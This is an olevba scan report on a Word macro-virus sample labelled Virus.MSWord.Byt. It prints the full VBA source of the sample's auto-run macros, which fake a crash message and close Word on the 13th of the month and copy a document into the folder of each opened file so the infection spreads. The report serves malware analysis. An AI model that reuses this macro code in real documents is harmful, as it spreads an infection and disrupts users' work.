olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Byt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Byt - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Autoexec.bas 
in file: Virus.MSWord.Byt - OLE stream: 'Macros/VBA/Autoexec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Declare Function _
FindWindow _
Lib "user32" _
Alias "FindWindowA" _
(ByVal lpClassName As String, _
ByVal lpWindowName As String) _
As Long
Private Declare Function _
SendMessage _
Lib "user32" _
Alias "SendMessageA" _
(ByVal hwnd As Long, _
ByVal wMsg As Long, _
ByVal wParam As Long, _
lParam As Any) _
As Long
Public Const FILENAME As String = "\Attention.doc"
Sub Main()
If Day(Now) = 13 Then
MsgBox "Программа выполнила недопустимую операцию " & _
"и должна быть закрыта", vbCritical + vbOKOnly, "Microsoft Word"
CloseWinWord
End If
End Sub
Private Sub CloseWinWord()
Dim lngWinWord As Long
lngWinWord = FindWindow(vbNullString, "Microsoft Word")
SendMessage lngWinWord, 16, 0, 0
End Sub
Public Sub LegalCopy(Source As String, Destination As String)
On Error Resume Next
Kill Destination
Dim bytDocument() As Byte
ReDim bytDocument(1 To FileLen(Source))
Open Source For Binary As #1
Get #1, , bytDocument()
Close #1
Open Destination For Binary As #1
Put #1, , bytDocument()
Close #1
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: Virus.MSWord.Byt - OLE stream: 'Macros/VBA/Autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Sub Main()
LegalCopy NormalTemplate.Path & FILENAME, _
ActiveDocument.Path & FILENAME
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

